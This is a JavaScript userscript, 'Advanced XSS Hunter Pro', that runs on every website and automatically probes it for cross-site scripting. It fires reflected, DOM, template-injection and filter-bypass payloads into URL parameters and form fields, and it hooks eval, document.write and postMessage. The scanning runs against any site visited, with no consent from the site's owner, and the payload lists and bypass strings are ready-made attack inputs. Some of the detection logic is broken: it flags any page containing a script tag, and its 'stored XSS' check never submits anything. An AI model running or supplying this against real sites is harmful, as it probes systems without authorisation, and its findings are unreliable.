// ==UserScript==
// @name         Advanced XSS Hunter Pro
// @namespace    https://github.com/xsshunter
// @version      2.0
// @description  Advanced XSS scanner with reduced false positives and enhanced detection
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // Configuration
    const CONFIG = {
        scanDelay: 2000,
        maxConcurrentRequests: 3,
        timeout: 10000,
        debug: false,
        skipDomains: ['google.com', 'github.com', 'stackoverflow.com'], // Skip safe domains
        alertStyle: 'console' // 'alert' or 'console'
    };

    // Enhanced payload collection with context-aware payloads
    const PAYLOADS = {
        // Basic reflected XSS payloads
        reflected: [
            '"><script>alert("XSS-REFLECTED")</script>',
            '\';alert("XSS-REFLECTED");//',
            '"><svg/onload=alert("XSS-REFLECTED")>',
            '"><img src=x onerror=alert("XSS-REFLECTED")>',
            'javascript:alert("XSS-REFLECTED")',
            '"><iframe src="javascript:alert(\'XSS-REFLECTED\')">',
            '\"><script>alert(String.fromCharCode(88,83,83))</script>'
        ],
        
        // DOM-based XSS payloads
        dom: [
            '<img src=x onerror=alert("XSS-DOM")>',
            '<svg onload=alert("XSS-DOM")>',
            '<script>alert("XSS-DOM")</script>',
            'javascript:alert("XSS-DOM")',
            '\'-alert("XSS-DOM")-\'',
            '";alert("XSS-DOM");//'
        ],
        
        // Template injection payloads
        template: [
            '{{constructor.constructor("alert(\'XSS-TEMPLATE\')")()}}',
            '${alert("XSS-TEMPLATE")}',
            '#{alert("XSS-TEMPLATE")}',
            '<%= alert("XSS-TEMPLATE") %>',
            '{{alert("XSS-TEMPLATE")}}'
        ],
        
        // Bypass payloads for WAF evasion
        bypass: [
            '<scr<script>ipt>alert("XSS-BYPASS")</scr</script>ipt>',
            '<img src=x oneRRor=alert("XSS-BYPASS")>',
            '<svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;&#34;XSS-BYPASS&#34;&#41;>',
            'jaVaScRiPt:alert("XSS-BYPASS")',
            '<iframe src="javas&Tab;cript:alert(\'XSS-BYPASS\')">'
        ]
    };

    // Unique marker for our payloads
    const XSS_MARKER = Math.random().toString(36).substring(7);
    
    // Results storage
    const detectedVulns = new Set();
    const testedParams = new Set();

    // Utility functions
    const log = (message, type = 'info') => {
        if (CONFIG.debug || type === 'vulnerability') {
            const emoji = type === 'vulnerability' ? '🚨' : 'ℹ️';
            console.log(`${emoji} [XSS Hunter] ${message}`);
        }
    };

    const notify = (message) => {
        if (CONFIG.alertStyle === 'console') {
            console.warn(`🚨 XSS VULNERABILITY DETECTED: ${message}`);
        } else {
            alert(`🚨 XSS VULNERABILITY DETECTED:\n${message}`);
        }
    };

    const shouldSkipDomain = () => {
        const hostname = window.location.hostname.toLowerCase();
        return CONFIG.skipDomains.some(domain => hostname.includes(domain));
    };

    const isValidXSSContext = (html, payload) => {
        // Enhanced validation to reduce false positives
        const cleanPayload = payload.replace(/["']/g, '');
        
        // Check if payload is actually reflected, not just present
        const payloadRegex = new RegExp(escapeRegExp(cleanPayload), 'gi');
        const matches = html.match(payloadRegex);
        
        if (!matches) return false;
        
        // Check context - ensure it's in a vulnerable position
        const vulnerableContexts = [
            /<script[^>]*>.*?<\/script>/gi,
            /<[^>]+on\w+\s*=\s*[^>]*>/gi,
            /href\s*=\s*["']javascript:/gi,
            /src\s*=\s*["']javascript:/gi,
            /<iframe[^>]*src\s*=\s*["']javascript:/gi
        ];
        
        return vulnerableContexts.some(regex => regex.test(html));
    };

    const escapeRegExp = (string) => {
        return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    };

    const generateContextPayload = (param, value) => {
        // Generate payload based on parameter context
        const paramLower = param.toLowerCase();
        
        if (paramLower.includes('url') || paramLower.includes('redirect')) {
            return 'javascript:alert("XSS-REDIRECT")';
        }
        if (paramLower.includes('callback') || paramLower.includes('jsonp')) {
            return 'alert("XSS-JSONP")';
        }
        if (paramLower.includes('search') || paramLower.includes('query')) {
            return '"><script>alert("XSS-SEARCH")</script>';
        }
        
        return PAYLOADS.reflected[0]; // Default payload
    };

    // Enhanced Reflected XSS Testing
    async function testReflectedXSS() {
        if (shouldSkipDomain()) {
            log('Skipping XSS scan on safe domain');
            return;
        }

        const url = new URL(window.location.href);
        const originalParams = new URLSearchParams(url.search);
        
        if (originalParams.size === 0) {
            log('No URL parameters found for reflected XSS testing');
            return;
        }

        log(`Testing ${originalParams.size} URL parameters for reflected XSS`);
        
        const promises = [];
        let requestCount = 0;

        for (const [param, originalValue] of originalParams) {
            if (testedParams.has(param)) continue;
            testedParams.add(param);

            // Test multiple payloads per parameter
            const payloadsToTest = [
                generateContextPayload(param, originalValue),
                ...PAYLOADS.reflected.slice(0, 3), // Limit to reduce requests
                ...PAYLOADS.bypass.slice(0, 2)
            ];

            for (const payload of payloadsToTest) {
                if (requestCount >= CONFIG.maxConcurrentRequests) {
                    await Promise.race(promises);
                    requestCount--;
                }

                const testUrl = new URL(url);
                const markedPayload = `${payload}_${XSS_MARKER}`;
                testUrl.searchParams.set(param, markedPayload);

                const promise = testReflectedPayload(testUrl.toString(), param, markedPayload, originalValue);
                promises.push(promise);
                requestCount++;
            }
        }

        await Promise.all(promises);
    }

    async function testReflectedPayload(testUrl, param, payload, originalValue) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), CONFIG.timeout);

            const response = await fetch(testUrl, {
                method: 'GET',
                signal: controller.signal,
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            });

            clearTimeout(timeoutId);

            if (!response.ok) return;

            const html = await response.text();
            
            // Enhanced validation
            if (isValidXSSContext(html, payload) && html.includes(XSS_MARKER)) {
                const vulnKey = `reflected_${param}_${payload.substring(0, 20)}`;
                if (!detectedVulns.has(vulnKey)) {
                    detectedVulns.add(vulnKey);
                    notify(`Reflected XSS in parameter '${param}'\nPayload: ${payload}\nURL: ${testUrl}`);
                    log(`Reflected XSS found in parameter: ${param}`, 'vulnerability');
                }
            }

        } catch (error) {
            if (error.name !== 'AbortError') {
                log(`Error testing reflected XSS: ${error.message}`);
            }
        }
    }

    // Enhanced DOM XSS Testing
    function testDOMXSS() {
        log('Testing for DOM-based XSS vulnerabilities');
        
        // Test common DOM manipulation methods
        const domTests = [
            testInnerHTML,
            testDocumentWrite,
            testEval,
            testLocationHash,
            testPostMessage
        ];

        domTests.forEach(test => {
            try {
                test();
            } catch (error) {
                log(`Error in DOM XSS test: ${error.message}`);
            }
        });
    }

    function testInnerHTML() {
        PAYLOADS.dom.forEach((payload, index) => {
            try {
                const testDiv = document.createElement('div');
                testDiv.id = `xss-test-${index}-${XSS_MARKER}`;
                testDiv.style.display = 'none';
                
                const markedPayload = `${payload}_${XSS_MARKER}`;
                testDiv.innerHTML = markedPayload;
                document.body.appendChild(testDiv);

                // Check if script executed or dangerous content was inserted
                if (testDiv.querySelector('script, iframe, object, embed, svg[onload]')) {
                    const vulnKey = `dom_innerHTML_${index}`;
                    if (!detectedVulns.has(vulnKey)) {
                        detectedVulns.add(vulnKey);
                        notify(`DOM XSS via innerHTML\nPayload: ${markedPayload}`);
                        log('DOM XSS via innerHTML detected', 'vulnerability');
                    }
                }

                // Cleanup
                document.body.removeChild(testDiv);
            } catch (error) {
                log(`innerHTML test error: ${error.message}`);
            }
        });
    }

    function testDocumentWrite() {
        // Test document.write if available and safe to test
        if (typeof document.write === 'function' && document.readyState === 'complete') {
            const originalWrite = document.write;
            let writeAttempted = false;
            
            document.write = function(content) {
                if (content && content.includes(XSS_MARKER)) {
                    writeAttempted = true;
                    const vulnKey = 'dom_document_write';
                    if (!detectedVulns.has(vulnKey)) {
                        detectedVulns.add(vulnKey);
                        notify(`DOM XSS via document.write\nContent: ${content}`);
                        log('DOM XSS via document.write detected', 'vulnerability');
                    }
                }
                return originalWrite.call(this, content);
            };

            // Test payload
            setTimeout(() => {
                try {
                    const testPayload = `<script>/*${XSS_MARKER}*/</script>`;
                    document.write(testPayload);
                } catch (error) {
                    log(`document.write test error: ${error.message}`);
                } finally {
                    document.write = originalWrite;
                }
            }, 100);
        }
    }

    function testEval() {
        // Monitor eval usage (if possible)
        if (typeof window.eval === 'function') {
            const originalEval = window.eval;
            window.eval = function(code) {
                if (code && typeof code === 'string' && code.includes(XSS_MARKER)) {
                    const vulnKey = 'dom_eval';
                    if (!detectedVulns.has(vulnKey)) {
                        detectedVulns.add(vulnKey);
                        notify(`DOM XSS via eval()\nCode: ${code}`);
                        log('DOM XSS via eval() detected', 'vulnerability');
                    }
                }
                return originalEval.call(this, code);
            };
        }
    }

    function testLocationHash() {
        // Test location.hash manipulation
        if (window.location.hash) {
            const hash = decodeURIComponent(window.location.hash.substring(1));
            PAYLOADS.dom.forEach(payload => {
                if (hash.includes(payload.replace(/['"]/g, ''))) {
                    const vulnKey = 'dom_location_hash';
                    if (!detectedVulns.has(vulnKey)) {
                        detectedVulns.add(vulnKey);
                        notify(`DOM XSS via location.hash\nHash: ${hash}`);
                        log('DOM XSS via location.hash detected', 'vulnerability');
                    }
                }
            });
        }
    }

    function testPostMessage() {
        // Monitor postMessage events
        window.addEventListener('message', function(event) {
            if (event.data && typeof event.data === 'string') {
                PAYLOADS.dom.forEach(payload => {
                    if (event.data.includes(payload.replace(/['"]/g, ''))) {
                        const vulnKey = 'dom_postmessage';
                        if (!detectedVulns.has(vulnKey)) {
                            detectedVulns.add(vulnKey);
                            notify(`DOM XSS via postMessage\nData: ${event.data}\nOrigin: ${event.origin}`);
                            log('DOM XSS via postMessage detected', 'vulnerability');
                        }
                    }
                });
            }
        });
    }

    // Enhanced Stored XSS Testing
    function testStoredXSS() {
        log('Testing form inputs for stored XSS vulnerabilities');
        
        const inputs = document.querySelectorAll('input[type="text"], input[type="search"], input[type="url"], textarea, [contenteditable="true"]');
        
        inputs.forEach((input, index) => {
            try {
                testInputForStoredXSS(input, index);
            } catch (error) {
                log(`Error testing input for stored XSS: ${error.message}`);
            }
        });
    }

    function testInputForStoredXSS(input, index) {
        const originalValue = input.value || input.textContent || '';
        const inputName = input.name || input.id || `input_${index}`;
        
        // Skip if input seems to contain sensitive data
        if (originalValue.match(/password|secret|token|key/i)) {
            return;
        }

        PAYLOADS.dom.slice(0, 2).forEach((payload, payloadIndex) => {
            const markedPayload = `${payload}_${XSS_MARKER}`;
            
            // Test input assignment
            try {
                if (input.tagName.toLowerCase() === 'input' || input.tagName.toLowerCase() === 'textarea') {
                    input.value = markedPayload;
                    
                    // Check if payload is reflected in value
                    if (input.value === markedPayload) {
                        // Simulate form submission to test stored XSS
                        simulateFormSubmission(input, markedPayload, inputName);
                    }
                } else if (input.contentEditable === 'true') {
                    input.textContent = markedPayload;
                    
                    if (input.innerHTML.includes(XSS_MARKER)) {
                        const vulnKey = `stored_contenteditable_${inputName}_${payloadIndex}`;
                        if (!detectedVulns.has(vulnKey)) {
                            detectedVulns.add(vulnKey);
                            notify(`Potential Stored XSS in contenteditable element\nElement: ${inputName}\nPayload: ${markedPayload}`);
                            log(`Stored XSS in contenteditable element: ${inputName}`, 'vulnerability');
                        }
                    }
                }
                
                // Restore original value
                if (input.tagName.toLowerCase() === 'input' || input.tagName.toLowerCase() === 'textarea') {
                    input.value = originalValue;
                } else {
                    input.textContent = originalValue;
                }
                
            } catch (error) {
                log(`Error testing input ${inputName}: ${error.message}`);
            }
        });
    }

    function simulateFormSubmission(input, payload, inputName) {
        const form = input.closest('form');
        if (!form) return;

        // Don't actually submit, just check if the form would accept the payload
        const formData = new FormData(form);
        
        // Check if our payload would be submitted
        for (const [key, value] of formData.entries()) {
            if (value === payload) {
                const vulnKey = `stored_form_${inputName}`;
                if (!detectedVulns.has(vulnKey)) {
                    detectedVulns.add(vulnKey);
                    notify(`Potential Stored XSS in form input\nInput: ${inputName}\nForm action: ${form.action || 'current page'}\nPayload: ${payload}`);
                    log(`Potential stored XSS in form input: ${inputName}`, 'vulnerability');
                }
                break;
            }
        }
    }

    // Template Injection Testing
    function testTemplateInjection() {
        log('Testing for template injection vulnerabilities');
        
        const url = new URL(window.location.href);
        if (url.searchParams.size === 0) return;

        PAYLOADS.template.forEach((payload, index) => {
            url.searchParams.forEach((value, key) => {
                const testUrl = new URL(url);
                const markedPayload = `${payload}_${XSS_MARKER}`;
                testUrl.searchParams.set(key, markedPayload);

                fetch(testUrl.toString())
                    .then(res => res.text())
                    .then(html => {
                        if (html.includes(XSS_MARKER) && isValidXSSContext(html, markedPayload)) {
                            const vulnKey = `template_${key}_${index}`;
                            if (!detectedVulns.has(vulnKey)) {
                                detectedVulns.add(vulnKey);
                                notify(`Template Injection in parameter '${key}'\nPayload: ${markedPayload}`);
                                log(`Template injection found in parameter: ${key}`, 'vulnerability');
                            }
                        }
                    })
                    .catch(error => {
                        log(`Template injection test error: ${error.message}`);
                    });
            });
        });
    }

    // CSP Bypass Detection
    function analyzeCSP() {
        const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
        const cspHeader = document.querySelector('meta[name="content-security-policy"]');
        
        if (cspMeta || cspHeader) {
            const csp = (cspMeta?.content || cspHeader?.content || '').toLowerCase();
            log(`CSP detected: ${csp}`);
            
            // Analyze CSP for potential bypasses
            if (!csp.includes("'unsafe-inline'") && !csp.includes("'unsafe-eval'")) {
                log('Strong CSP detected - XSS exploitation may be limited');
            } else {
                log('Weak CSP detected - XSS exploitation may be possible');
            }
        }
    }

    // Main execution function
    function runXSSTests() {
        if (shouldSkipDomain()) {
            log('Skipping XSS tests on safe domain');
            return;
        }

        log('Starting XSS vulnerability scan...');
        
        // Analyze security headers
        analyzeCSP();
        
        // Run all tests
        setTimeout(async () => {
            try {
                await testReflectedXSS();
                testDOMXSS();
                testStoredXSS();
                testTemplateInjection();
                
                setTimeout(() => {
                    if (detectedVulns.size === 0) {
                        log('XSS scan completed - no vulnerabilities detected');
                    } else {
                        log(`XSS scan completed - ${detectedVulns.size} vulnerabilities detected`, 'vulnerability');
                    }
                }, 2000);
                
            } catch (error) {
                log(`Error during XSS testing: ${error.message}`);
            }
        }, CONFIG.scanDelay);
    }

    // Initialize scanner when page is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', runXSSTests);
    } else {
        runXSSTests();
    }

    // Also run tests when the page changes (for SPAs)
    let lastUrl = location.href;
    new MutationObserver(() => {
        if (location.href !== lastUrl) {
            lastUrl = location.href;
            setTimeout(runXSSTests, 1000);
        }
    }).observe(document, { subtree: true, childList: true });

})();